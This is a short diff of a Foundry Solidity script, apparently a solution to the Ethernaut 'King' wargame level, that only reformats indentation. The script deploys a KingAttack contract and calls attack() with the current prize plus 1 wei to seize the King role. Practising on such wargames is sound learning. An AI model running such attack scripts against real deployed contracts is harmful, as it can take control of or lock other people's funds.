@@ -10,13 +10,13 @@ contract KingScript is Script {
     KingAttack public attacker;
 
     function run() external {
-	vm.startBroadcast();
-	attacker = new KingAttack();
-	console.log("KingAttack Contract deployed to:", address(attacker));
-	uint256 prize = instance.prize();
-	console.log("Current prize:", prize);
-	attacker.attack{value: prize + 1 wei}(address(instance));
-	console.log("KingAttack Contract is now the new King!");
-	vm.stopBroadcast();
+        vm.startBroadcast();
+        attacker = new KingAttack();
+        console.log("KingAttack Contract deployed to:", address(attacker));
+        uint256 prize = instance.prize();
+        console.log("Current prize:", prize);
+        attacker.attack{value: prize + 1 wei}(address(instance));
+        console.log("KingAttack Contract is now the new King!");
+        vm.stopBroadcast();
     }
 }
